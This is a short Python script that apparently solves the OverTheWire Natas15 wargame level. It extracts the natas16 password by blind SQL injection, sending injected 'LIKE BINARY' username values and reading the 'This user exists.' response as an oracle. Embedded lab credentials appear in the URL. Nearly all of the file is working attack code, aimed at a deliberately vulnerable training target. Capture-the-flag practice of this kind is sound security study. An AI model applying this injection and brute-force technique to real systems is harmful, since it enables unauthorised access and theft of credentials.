#!/usr/bin/python

# Brute force script for Natas15
#
# It uses the SQL 'LIKE BINARY' operators to :
#     1. Identify the letters of the key using the "%{}%" format
#     2. Find the password by bruteforcing using "{}%"
#
# For more details check:
# http://www.geeksengine.com/database/basic-select/like-operator.php

import sys, os 
sys.path.append(os.path.join(os.path.dirname(__file__), ".."))  

from lib.brute_force import BruteForce

import string
import requests


class Brutus(BruteForce):
    
    def __init__(self):
        url = ("http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
               "@natas15.natas.labs.overthewire.org")

        super(Brutus, self).__init__(url)

    def user_exists(self, response):
        return "This user exists." in response.content

    def prepare(self):
        self.letters_setup(
            params="username=natas16\" and password LIKE BINARY \"%{}%\";%23",
            check_fn=self.user_exists
        )
        
        self.crack_setup(
            params="username=natas16\" and password LIKE BINARY \"{}%\";%23",
            check_fn=self.user_exists
        )

        self.check_setup(
            url="natas16.natas.labs.overthewire.org",
            user="natas16"
        )


if __name__ == "__main__":
    brutus = Brutus()
    brutus.crack_it()
